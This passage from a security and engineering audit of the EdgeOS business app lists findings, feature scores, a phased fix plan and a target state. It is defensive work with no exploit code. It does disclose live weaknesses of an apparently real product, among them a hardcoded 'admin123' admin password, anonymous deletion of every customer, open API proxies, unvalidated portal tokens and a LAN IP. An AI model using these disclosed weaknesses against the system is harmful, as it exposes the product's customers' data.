### M-9 · No offline handling or network-failure UX

There is no `navigator.onLine` check, no offline banner, no request retry, and no queued-write indicator anywhere in `src/`. Firestore offline persistence is not enabled in `src/lib/firebase.js`.

Because writes go to `localStorage` first and fire-and-forget to the network (H-7), the app **appears to work offline and silently loses data**.

**Fix prompt:** Enable Firestore IndexedDB persistence in `firebase.js`. Add an online/offline detector and a persistent banner when offline. Show a per-document sync state (synced / pending / failed). Add exponential-backoff retry for transient failures. Ensure the UI never reports success for an unconfirmed write. Test with DevTools offline mode: create a record offline, go online, and confirm it syncs exactly once.

---

### M-10 · Landing page and app share one render path

`App.jsx:226-231` renders `LandingPage`, `Auth` or `Registration` from inside `AppContent`, which sits below `AuthProvider` and `OrgProvider` (`App.jsx:610-628`). Anonymous visitors therefore initialize Firebase Auth, mount both context providers, and (per H-1) download the entire app bundle.

**Fix prompt:** Split the route tree at the top level so marketing routes render outside `AuthProvider`/`OrgProvider` and outside the app bundle. This directly enables the H-1 and H-6 fixes. Verify that an anonymous visit makes no Firestore reads and downloads only the marketing chunk.

---

### M-11 · `activeOrg` selection is arbitrary and unswitchable

`OrgContext.jsx:94` does `setActiveOrg(nextOrgs[0])` with no persistence of the user's last choice and no ordering guarantee — `fetchOrganizationIds` builds a `Set` from three sources in non-deterministic order. `setActiveOrg` is exported (line 185) but no UI calls it, and calling it would not reload data (see H-2).

**Fix prompt:** Persist the last active org per user. Build a real org switcher in the sidebar. Make `setActiveOrg` tear down and rebuild the data layer (depends on H-2). Handle the removed-from-org case by falling back to another org or to an empty state.

---

### M-12 · `pdfService.js` is a 1,115-line, 58 KB module with no tests

The single largest service file, responsible for every legally binding document the product emits. It contains two ESLint-flagged sparse arrays (lines 569, 875) and an empty catch (line 151). It is statically imported, so jsPDF ships in the main bundle (H-1).

**Fix prompt:** Split by document type into `src/services/pdf/{offer,certificate,nda,mou,invoice,quotation,proforma}.js` with a shared layout primitives module. Make it dynamically imported at call sites. Add snapshot tests that generate each document type and compare against committed reference PDFs so layout regressions are caught. Fix the sparse arrays and the empty catch. This is a prerequisite for safely upgrading jsPDF (H-10).

---

### M-13 · No audit trail on legally significant actions

Nothing records who issued, edited, sent, signed or deleted a document. `records` entries store `user_id` (`storageService.js:39`) but never who modified them afterwards, and edits overwrite in place via `setItem`.

For a product generating employment contracts, NDAs and tax invoices, this is a compliance and dispute-resolution gap.

**Fix prompt:** Add an append-only `audit_log` collection: actor uid, action, entity type and id, orgId, timestamp, IP, before/after diff for mutations. Write to it from the server (rules deny all client writes). Cover: document created/edited/sent/signed/declined/deleted, member added/removed/role changed, profile and bank-detail changes, admin actions, and login events. Surface a per-document history view. Retain for 7 years to match Indian statutory requirements.

---

### M-14 · Bulk operations lack transactional safety

`src/components/bulk/*` (1,100+ lines across four components) generate and send documents in batches with a progress tracker (`BulkProgressTracker.jsx`), but there is no transaction, no rollback and no resume. A failure at item 40 of 100 leaves 39 documents issued and emailed, with no record of where it stopped and no way to continue.

**Fix prompt:** Model a bulk job as a persisted document with per-item status (pending/succeeded/failed) written before processing begins. Process items idempotently keyed by row, so a resumed job never re-sends. Add resume and retry-failed-only actions. Surface a per-item result table with downloadable errors. Rate-limit sends to respect Gmail's limits and the C-5 rate limiter. Test by killing the tab mid-job and resuming.

---

### M-15 · Dev-only middleware diverges from production behaviour

`vite.config.js:30-65` implements a hand-rolled `/api/email` shim with a fake `res` object, and lines 67-81 proxy `/api/nvidia` **directly to NVIDIA**, bypassing `api/nvidia.js` entirely. Local development therefore never exercises the real serverless handlers — including, after C-5 and C-6, their authentication.

**Fix prompt:** Use `vercel dev` (or the chosen platform's local runtime) so development runs the actual functions. Delete the shim and the direct proxy. If a shim must remain, make it import and invoke the real handler with a faithful req/res, including the auth path. Verify that a request rejected in production is equally rejected locally.

---

### M-16 · No rate limiting or abuse protection on any surface

No rate limiting exists on `/api/email`, `/api/nvidia`, authentication, signup, or the recipient portal. No CAPTCHA on signup. Firebase Auth's built-in throttling is the only control, and it does not cover the API routes.

**Fix prompt:** Add per-IP and per-org rate limiting to both API routes (Upstash Redis or a Firestore counter). Add App Check to the Firebase project to block non-app clients. Add a CAPTCHA or Firebase App Check on signup. Rate-limit portal token verification to prevent brute-forcing. Add alerting on anomalous volume.

---

# PART IV — LOW SEVERITY FINDINGS

| ID | Finding | Evidence | Fix |
|---|---|---|---|
| L-1 | Package name is `qbitointern`, unrelated to the product | `package.json:2` | Rename to `edgeos`; set `version` from a real release process (currently `0.0.0`) |
| L-2 | README documents Supabase, but the app uses Firebase | `README.md:19` says "Backend / Auth: Supabase" | Rewrite README to match reality; document real setup, env vars and architecture |
| L-3 | README references a nonexistent file | `README.md:44` points to "`walkthrough.md` in the brain directory" | Remove or create it; add the actual schema docs |
| L-4 | `nohup.out` committed, leaking a LAN IP | Tracked file contains `http://192.168.29.229:5173/` | Delete and gitignore (covered by C-3) |
| L-5 | Root `SKILL.md` is an unrelated generic AI skill file | `SKILL.md` describes a "frontend-design" skill, not this project | Move to `.claude/skills/` or delete |
| L-6 | PWA manifest declares one icon at two sizes | `public/manifest.json` uses the same 192px PNG for 192 and 512 | Generate proper icon sizes; add real maskable variants |
| L-7 | No service worker despite PWA manifest | `manifest.json` exists; no SW registration in `main.jsx` | Add a service worker with offline shell caching, or drop the PWA claim |
| L-8 | Hardcoded `en-IN` locale and ₹ assumptions | `App.jsx:487` and throughout the financial components | Add i18n and multi-currency if international sale is intended |
| L-9 | `DESIGN_SYSTEM_AUDIT.md` (23 KB) is stale documentation in the repo root | Root directory | Move to `docs/`; verify it still reflects `index.css` |

---

# PART V — FEATURE-BY-FEATURE RATINGS

| Feature | Score | Assessment |
|---|---|---|
| **Landing page & marketing** | **7/10** | Visually excellent, well-structured, 12 content sub-pages. Undermined by zero SEO (H-6) and a 3.4 MB payload (H-1). |
| **Authentication** | **4/10** | Firebase Auth is a sound choice and Google sign-in works. But the onboarding gate is dead code (H-8), there is no email verification, no password-strength enforcement, and no MFA. |
| **Organization / multi-tenancy** | **2/10** | The concept is modelled but not enforced. No rules (C-1), singleton state leaks across orgs (H-2), no switcher (M-11), no invitations (H-9). |
| **Offer letters** | **6/10** | Good form design, sensible templates, PDF output works. No validation (M-4), no versioning, no audit trail (M-13). |
| **Certificates** | **6/10** | Clean implementation with template support. Same validation and audit gaps. |
| **NDA / MoU** | **5/10** | Legally-shaped documents with a signature flow — but the sparse-array defects at `MoUPreview.jsx:14` and `NdaPreview.jsx:14` may be dropping content (H-5), and there is no audit trail on execution. |
| **Invoices / Quotations / Proforma** | **5/10** | The most complete feature set: GST, line items, discounts, recurring billing. Undermined by unvalidated arithmetic with zero tests (H-12), colliding IDs (M-2), and the XSS sink (C-8). |
| **Recipient portal** | **2/10** | Genuinely differentiated feature, well-designed UI, 1,682 lines of real work — completely undone by the unvalidated token (C-4). This is the highest-value fix in the product. |
| **Employee registry** | **5/10** | Solid CRUD with departments and ex-employee archiving. Salary data has no field-level protection (H-9). |
| **Team hierarchy / org chart** | **6/10** | Nice use of `@xyflow/react`, drag-and-drop reporting lines. Heaviest dependency in the bundle and never code-split (H-1). 6 lint errors. |
| **Task board** | **5/10** | Functional Kanban with deadline monitoring. 5-second polling (H-14). |
| **CRM** | **5/10** | Lead pipeline present and coherent. No pagination (M-3), no validation. |
| **Customers** | **5/10** | Straightforward CRUD, well-integrated with invoicing. |
| **Billing & revenue dashboard** | **5/10** | Recharts visualizations, expense tracking. Reads all data with no aggregation (M-3). |
| **Bulk operations** | **4/10** | Ambitious — CSV upload, validation table, progress tracking, signature canvas. No transactional safety or resume (M-14). Gated behind a plan flag that is unenforced (C-7). |
| **AI Co-founder** | **4/10** | The most technically sophisticated part: 988-line company memory, decision engine, follow-up engine. But it runs on an open proxy (C-6), the quota is never incremented, org data flows to a third party with no allowlist, and its 2,800 lines of TypeScript are unchecked (H-13). |
| **Records archive** | **5/10** | Central document store with search and download. Loads everything at once. |
| **Company profile** | **4/10** | Comprehensive (821 lines) — branding, banking, signatures, stamps, email config. Stores Gmail App Passwords in plaintext (C-5) and base64 images inline (M-1). |
| **Admin panel** | **0/10** | Actively dangerous. `admin123`, client-side auth, anonymous Firebase access, permanent deletion (C-2). |
| **Notifications** | **3/10** | Works, but polls every 3 seconds (H-14), unbounded array in one document (M-6), org-global read state (M-6). |

---

# PART VI — WHERE TO START

The order below is **dependency-correct**. Each phase unblocks the next; doing them out of order means redoing work.

### Phase 0 — Stop the bleeding (Days 1–2)

Do these before anything else. They are small, and until they are done the application is actively unsafe.

1. **Revoke the leaked NVIDIA key** (C-3) — out of band, immediately. Then `.gitignore`, `git rm --cached .env`, plan the history purge.
2. **Take `/admin` offline** (C-2) — remove the route from the build, or block it at the edge, until it is rebuilt. It currently allows anyone to delete every customer.
3. **Add authentication to `/api/email` and `/api/nvidia`** (C-5, C-6) — even a temporary shared-secret check stops the open relay and the unmetered LLM billing today.
4. **Fix the `documentStore.save` crash** (H-3) — 10 minutes.

### Phase 1 — Make the data safe (Weeks 1–3)

Nothing else matters until tenant isolation is real.

5. **Firestore + RTDB security rules with the membership model** (C-1) — the single most important change in this audit. Includes the membership-ID migration.
6. **Recipient portal signed tokens** (C-4) — depends on C-1's decision about anonymous auth.
7. **Rebuild the admin panel on custom claims, with soft delete and audit log** (C-2).
8. **Encrypt SMTP credentials server-side; remove them from the client** (C-5) — depends on C-1 for the server-only collection.
9. **Fix the XSS sinks** (C-8) — independent, do it in parallel.
10. **Backups, restore runbook, and a tested restore** (C-9) — before any migration touches production data.

### Phase 2 — Make it correct (Weeks 4–6)

11. **Testing foundation + CI** (H-12) — must come before the refactors below, or you are refactoring blind. Start with security-rules tests and GST arithmetic.
12. **Fix all 86 ESLint errors** (H-5) — includes the sparse arrays that may be corrupting legal documents.
13. **Error boundaries + Sentry** (H-4).
14. **Onboarding gate** (H-8).
15. **Dependency remediation** (H-10) — after M-12 splits `pdfService`, so the jsPDF bump is testable.

### Phase 3 — Make it sound (Weeks 6–9)

16. **Collapse to a single source of truth** (H-7) — the biggest architectural change; needs Phase 2's tests to be safe.
17. **Per-org store instances** (H-2) — enables real org switching.
18. **TypeScript configuration and domain types** (H-13) — do it alongside H-7 so the new data layer is typed from birth.
19. **RBAC and invitations** (H-9) — needs C-1's rules and H-2's per-org context.
20. **Validation layer** (M-4), **ID generation** (M-2), **images to Storage** (M-1).

### Phase 4 — Make it fast and findable (Weeks 9–11)

21. **Code splitting** (H-1) — depends on M-10's route-tree split.
22. **Marketing/app split** (M-10).
23. **SEO and prerendering** (H-6).
24. **Real-time subscriptions replacing polls** (H-14).
25. **CSS tokenization and splitting** (M-8), **accessibility** (M-7).

### Phase 5 — Make it a business (Weeks 11–14)

26. **Payments and server-authoritative billing** (C-7) — deliberately last, because charging money for a system that cannot protect data is worse than not charging.
27. **Security headers and deployment consolidation** (H-11).
28. **Audit trail** (M-13), **bulk job durability** (M-14), **rate limiting** (M-16).

---

# PART VII — TARGET STATE

### What "production-grade" looks like for EdgeOS

**Security & tenancy.** Every read and write is authorized server-side by Firestore rules keyed on a membership document. Anonymous access grants nothing. The recipient portal issues signed, expiring, revocable tokens. Secrets live in a server-only collection, encrypted at rest, never touching the client. Admin identity is a custom claim verified server-side, every admin action is audited, and deletion is reversible for 30 days. No credential has ever been committed. Security headers score A. Rules are covered by tests that fail the build if isolation breaks.

**Data.** One source of truth: Firestore, with offline persistence for resilience rather than a parallel store. Every write is awaited, its failure surfaced to the user and to Sentry. IDs are collision-free; display numbers are generated by atomic server-side counters. Every entity has a zod schema enforced at the boundary and mirrored in rules. Images live in Storage behind a CDN. Backups run daily, restores have been rehearsed, and customers can export everything they own.

**Architecture.** Marketing and application are separate bundles; an anonymous visitor downloads under 200 KB gzipped and makes zero database reads. Routes are lazy. The data layer is instantiable and per-org, so multi-org users switch cleanly and the store is unit-testable. The 2,800 lines of TypeScript are type-checked under `strict`, and the domain types are the schema documentation.

**Quality.** Zero lint errors, enforced in CI. Financial arithmetic, plan limits, ID generation and security rules are covered by tests. Every document type has a PDF snapshot test. Playwright covers the three journeys that matter. Errors are caught by boundaries, reported to Sentry with PII scrubbed, and never blank the screen.

**Product.** Real payments with a signature-verified, idempotent webhook as the only writer of subscription state. Limits enforced server-side. Roles that actually restrict — a member cannot read salaries, a viewer cannot write, only an owner touches billing. Teams can invite each other. Every legally significant action is in an append-only audit log retained seven years.

**Discoverability.** Marketing pages prerendered to static HTML with per-route metadata, structured data, sitemap and robots.txt. Lighthouse SEO 100, Accessibility ≥ 95, Performance ≥ 90.

### Roadmap

| Stage | Weeks | Exit criteria |
|---|---|---|
| **Current state** | — | Prototype. Cannot safely hold customer data. |
| **→ Safe** | 0–3 | Tenant isolation enforced server-side. No open endpoints. No committed secrets. Backups tested. **Can onboard a first design partner.** |
| **→ Production-ready** | 4–9 | Tests + CI. Single source of truth. RBAC. Validation. Errors observable. **Can sign a paying customer.** |
| **→ Scalable** | 9–11 | Code-split, paginated, real-time. SEO live. Accessible. **Can support growth and organic acquisition.** |
| **→ Exceptional** | 11–14+ | Payments, audit trail, durable bulk jobs, SOC 2 groundwork. **Can sell to organizations that run due diligence.** |

---

## Closing assessment

The instinct behind EdgeOS is right, and the execution of the visible product is better than most seed-stage software. Someone with real taste designed this interface, and someone with real domain understanding scoped these features — GST-aware invoicing, proforma advance tracking, recipient e-signature portals and an org-aware AI assistant are not obvious things to build.

What is missing is the invisible half: the layer that decides who may read what, the tests that prove the arithmetic is right, and the operational discipline that lets you recover when something goes wrong. That layer is thin and well-understood. Almost every critical finding here is confined to security rules, one `api/` directory, one data-access module and the build configuration.

**The blunt version:** do not put a real customer's data in this system until Phase 1 is complete. After that, this is a credible product with roughly three months of foundational work between it and a business.

---

*Audit conducted by direct inspection of all source files, production build output, dependency audit, and static analysis. Every finding cites file and line. No conclusion is inferred without code evidence.*
